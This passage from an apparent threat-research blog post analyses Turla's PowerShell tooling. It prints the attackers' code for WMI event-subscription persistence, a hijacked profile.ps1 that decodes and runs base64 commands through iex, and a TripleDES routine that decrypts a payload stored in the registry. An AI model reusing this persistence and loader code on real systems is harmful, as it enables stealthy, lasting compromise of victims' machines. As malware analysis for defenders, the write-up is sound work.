class="crayon-sy">{</span><span class="crayon-v">Filter</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">VQI79dcf</span><span class="crayon-sy">;</span><span class="crayon-v">Consumer</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">NLP35gh</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e563713800678-10"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-60a99b2e3e563713800678-11"><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-e">WmiObject </span><span class="crayon-v">__eventFilter</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">namespace</span><span class="crayon-h"> </span><span class="crayon-v">root</span><span class="crayon-sy">\</span><span class="crayon-v">subscription</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">filter</span><span class="crayon-h"> </span><span class="crayon-s">"name='AD Bridge Filter'"</span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Remove</span><span class="crayon-o">-</span><span class="crayon-v">WmiObject</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e563713800678-12"><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-e">WmiObject </span><span class="crayon-v">__FilterToConsumerBinding</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">Namespace</span><span class="crayon-h"> </span><span class="crayon-v">root</span><span class="crayon-sy">\</span><span class="crayon-v">subscription</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-e">Where</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-sy">.</span><span class="crayon-v">filter</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">match</span><span class="crayon-h"> </span><span class="crayon-s">'AD Bridge'</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Remove</span><span class="crayon-o">-</span><span class="crayon-v">WmiObject</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a99b2e3e563713800678-13"><span class="crayon-sy">$</span><span class="crayon-v">IT825cd</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT * FROM __instanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 300 AND TargetInstance.SystemUpTime &lt; 400"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e563713800678-14"><span class="crayon-sy">$</span><span class="crayon-v">VQI79dcf</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">Set</span><span class="crayon-o">-</span><span class="crayon-e">WmiInstance</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">Class</span><span class="crayon-h"> </span><span class="crayon-e">__EventFilter</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">Namespace</span><span class="crayon-h"> </span><span class="crayon-e">root</span><span class="crayon-sy">\</span><span class="crayon-e">subscription</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Arguments</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">{</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">'AD Bridge Filter'</span><span class="crayon-sy">;</span><span class="crayon-v">EventNameSpace</span><span class="crayon-o">=</span><span class="crayon-s">'root\CimV2'</span><span class="crayon-sy">;</span><span class="crayon-v">QueryLanguage</span><span class="crayon-o">=</span><span class="crayon-s">'WQL'</span><span class="crayon-sy">;</span><span class="crayon-v">Query</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">IT825cd</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a99b2e3e563713800678-15"><span class="crayon-e">Set</span><span class="crayon-o">-</span><span class="crayon-e">WmiInstance</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">Namespace</span><span class="crayon-h"> </span><span class="crayon-e">root</span><span class="crayon-sy">\</span><span class="crayon-e">subscription</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">Class</span><span class="crayon-h"> </span><span class="crayon-e">__FilterToConsumerBinding</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Arguments</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">{</span><span class="crayon-v">Filter</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">VQI79dcf</span><span class="crayon-sy">;</span><span class="crayon-v">Consumer</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">NLP35gh</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0014 seconds] -->
<p><em>Figure 1. Persistence using WMI</em></p>
<p>These events will run respectively at 15:30:40 and when the system uptime is between 300 and 400 seconds. The variable <span style="font-family: courier new, courier, monospace;">$HL39fjh</span> contains the base64-encoded PowerShell command shown in Figure 2. It reads the Windows Registry key where the encrypted payload is stored, and contains the password and the salt needed to decrypt the payload.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a99b2e3e56e252494886" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("&lt;base64-encoded password and salt"&gt;)) | iex ;[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((Get-ItemProperty '$ZM172da').'$WY79ad')) | iex</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a99b2e3e56e252494886-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a99b2e3e56e252494886-1"><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Text</span><span class="crayon-sy">.</span><span class="crayon-v">Encoding</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">ASCII</span><span class="crayon-sy">.</span><span class="crayon-e">GetString</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Convert</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">FromBase64String</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;base64-encoded password and salt"</span><span class="crayon-o">&gt;</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-i">iex</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-sy">[</span><span class="crayon-v">Text</span><span class="crayon-sy">.</span><span class="crayon-v">Encoding</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">ASCII</span><span class="crayon-sy">.</span><span class="crayon-e">GetString</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Convert</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">FromBase64String</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-i">ItemProperty</span><span class="crayon-h"> </span><span class="crayon-s">'$ZM172da'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">'$WY79ad'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">iex</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p><em>Figure 2. WMI consumer PowerShell command</em></p>
<p>Finally, the script stores the encrypted payload in the Windows registry. Note that the attackers seem to use a different registry location per organization. Thus, it is not a useful indicator to detect similar intrusions.</p>
<h3>Profile.ps1</h3>
<p>In the latter case, attackers alter the PowerShell profile. According to the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6" target="_blank" rel="noopener">Microsoft documentation</a>:</p>
<div class="update-block"></p>
<p style="text-align: center;"><em>A PowerShell profile is a script that runs when PowerShell starts. You can use the profile as a logon script to customize the environment. You can add commands, aliases, functions, variables, snap-ins, modules, and PowerShell drives.</em></p>
<p></div>
<p>Figure 3 shows a PowerShell profile modified by Turla.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a99b2e3e571379045293" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
try
{
    $SystemProc = (Get-WmiObject 'Win32_Process' | ?{$_.ProcessId -eq $PID} |  % {Invoke-WmiMethod -InputObject $_ -Name 'GetOwner'} | ?{(Get-WmiObject -Class Win32_Account -Filter "name='$($_.User)'").SID -eq "S-1-5-18"})
    if ("$SystemProc" -ne "")
    {
      $([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes("&lt;m&gt;$([DateTime]::Now.ToString('G')): STARTED &lt;/m&gt;") | %{ $_ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append;
      [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("IABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAIgBKAEYAZABJAFIAegBRADQATQBXAFIAawBJAEQAMABuAFEAMQBsAEQAVgBEAE0ANQBNAHoAUQB3AFoAbQBaAG8ASgB6AHMAZwBKAEUAWgBaAE4AVABKAGoAWgBUADAAbgBUAGsATgBEAFUAagBrADUATgB6AEIAbwBaAG0AaABqAEoAegBzAGcASQBBAD0APQAiACkAKQAgAHwAIABpAGUAeAAgADsAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAnAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwASQBuAHQAZQByAG4AZQB0ACAARQB4AHAAbABvAHIAZQByAFwAQQBjAHQAaQB2AGUAWAAgAEMAbwBtAHAAYQB0AGkAYgBpAGwAaQB0AHkAXAB7ADIAMgA2AGUAZAA1ADMAMwAtAGYAMQBiADAALQA0ADgAMQBkAC0AYQBkADIANgAtADAAYQBlADcAOABiAGMAZQA4ADEAZAA3AH0AJwApAC4AJwAoAEQAZQBmAGEAdQBsAHQAKQAnACkAKQAgAHwAIABpAGUAeAA=")) | iex | Out-Null;
      kill $PID;
    }
}
catch{$([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes("&lt;m&gt;$([DateTime]::Now.ToString('G')): $_ &lt;/m&gt;") | %{ $_ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a99b2e3e571379045293-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e571379045293-2">2</div><div class="crayon-num" data-line="crayon-60a99b2e3e571379045293-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e571379045293-4">4</div><div class="crayon-num" data-line="crayon-60a99b2e3e571379045293-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e571379045293-6">6</div><div class="crayon-num" data-line="crayon-60a99b2e3e571379045293-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e571379045293-8">8</div><div class="crayon-num" data-line="crayon-60a99b2e3e571379045293-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e571379045293-10">10</div><div class="crayon-num" data-line="crayon-60a99b2e3e571379045293-11">11</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a99b2e3e571379045293-1"><span class="crayon-st">try</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e571379045293-2"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60a99b2e3e571379045293-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">SystemProc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-i">WmiObject</span><span class="crayon-h"> </span><span class="crayon-s">'Win32_Process'</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-sy">.</span><span class="crayon-v">ProcessId</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">PID</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-v">Invoke</span><span class="crayon-o">-</span><span class="crayon-v">WmiMethod</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">InputObject</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Name</span><span class="crayon-h"> </span><span class="crayon-s">'GetOwner'</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-sy">{</span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">WmiObject</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">Class</span><span class="crayon-h"> </span><span class="crayon-v">Win32_Account</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Filter</span><span class="crayon-h"> </span><span class="crayon-s">"name='$($_.User)'"</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-v">SID</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-s">"S-1-5-18"</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e571379045293-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"$SystemProc"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">ne</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a99b2e3e571379045293-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e571379045293-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Convert</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">ToBase64String</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Text</span><span class="crayon-sy">.</span><span class="crayon-v">Encoding</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">ASCII</span><span class="crayon-sy">.</span><span class="crayon-e">GetBytes</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;m&gt;$([DateTime]::Now.ToString('G')): STARTED &lt;/m&gt;"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">bxor</span><span class="crayon-h"> </span><span class="crayon-cn">0xAA</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"|"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Out</span><span class="crayon-o">-</span><span class="crayon-i">File</span><span class="crayon-h"> </span><span class="crayon-s">'C:\Users\Public\Downloads\thumbs.ini'</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">Append</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a99b2e3e571379045293-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-v">Text</span><span class="crayon-sy">.</span><span class="crayon-v">Encoding</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Unicode</span><span class="crayon-sy">.</span><span class="crayon-e">GetString</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Convert</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">FromBase64String</span><span class="crayon-sy">(</span><span class="crayon-s">"IABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAIgBKAEYAZABJAFIAegBRADQATQBXAFIAawBJAEQAMABuAFEAMQBsAEQAVgBEAE0ANQBNAHoAUQB3AFoAbQBaAG8ASgB6AHMAZwBKAEUAWgBaAE4AVABKAGoAWgBUADAAbgBUAGsATgBEAFUAagBrADUATgB6AEIAbwBaAG0AaABqAEoAegBzAGcASQBBAD0APQAiACkAKQAgAHwAIABpAGUAeAAgADsAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAnAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwASQBuAHQAZQByAG4AZQB0ACAARQB4AHAAbABvAHIAZQByAFwAQQBjAHQAaQB2AGUAWAAgAEMAbwBtAHAAYQB0AGkAYgBpAGwAaQB0AHkAXAB7ADIAMgA2AGUAZAA1ADMAMwAtAGYAMQBiADAALQA0ADgAMQBkAC0AYQBkADIANgAtADAAYQBlADcAOABiAGMAZQA4ADEAZAA3AH0AJwApAC4AJwAoAEQAZQBmAGEAdQBsAHQAKQAnACkAKQAgAHwAIABpAGUAeAA="</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">iex</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Out</span><span class="crayon-o">-</span><span class="crayon-t">Null</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e571379045293-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">kill</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">PID</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a99b2e3e571379045293-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e571379045293-10"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a99b2e3e571379045293-11"><span class="crayon-st">catch</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Convert</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">ToBase64String</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Text</span><span class="crayon-sy">.</span><span class="crayon-v">Encoding</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">ASCII</span><span class="crayon-sy">.</span><span class="crayon-e">GetBytes</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;m&gt;$([DateTime]::Now.ToString('G')): $_ &lt;/m&gt;"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">bxor</span><span class="crayon-h"> </span><span class="crayon-cn">0xAA</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"|"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Out</span><span class="crayon-o">-</span><span class="crayon-i">File</span><span class="crayon-h"> </span><span class="crayon-s">'C:\Users\Public\Downloads\thumbs.ini'</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">Append</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0011 seconds] -->
<p><em>Figure 3. Hijacked <span style="font-family: georgia, palatino, serif;">profile.ps1</span> file</em></p>
<p>The base64-encoded PowerShell command is very similar to the one used in the WMI consumers.</p>
<h2>Decryption</h2>
<p>The payload stored in the Windows registry is another PowerShell script. It is generated using the open-source script <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1" target="_blank" rel="noopener">Out-EncryptedScript.ps1</a> from the Penetration testing framework <a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">PowerSploit</a>. In addition, the variable names are randomized to obfuscate the script, as shown in Figure 4.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a99b2e3e575273604298" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$GSP540cd = "&lt;base64 encoded + encrypted payload&gt;";
$RS99ggf = $XZ228hha.GetBytes("PINGQXOMQFTZGDZX");
$STD33abh = [Convert]::FromBase64String($GSP540cd);
$SB49gje = New-Object System.Security.Cryptography.PasswordDeriveBytes($IY51aab, $XZ228hha.GetBytes($CBI61aeb), "SHA1", 2);
[Byte[]]$XYW18ja = $SB49gje.GetBytes(16);
$EN594ca = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider;
$EN594ca.Mode = [System.Security.Cryptography.CipherMode]::CBC;
[Byte[]]$ID796ea = New-Object Byte[]($STD33abh.Length);
$ZQD772bf = $EN594ca.CreateDecryptor($XYW18ja, $RS99ggf);
$DCR12ffg = New-Object System.IO.MemoryStream($STD33abh, $True);
$WG731ff = New-Object System.Security.Cryptography.CryptoStream($DCR12ffg, $ZQD772bf, [System.Security.Cryptography.CryptoStreamMode]::Read);
$XBD387bb = $WG731ff.Read($ID796ea, 0, $ID796ea.Length);
$OQ09hd = [YR300hf]::IWM01jdg($ID796ea);
$DCR12ffg.Close();
$WG731ff.Close();
$EN594ca.Clear();
return $XZ228hha.GetString($OQ09hd,0,$OQ09hd.Length);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
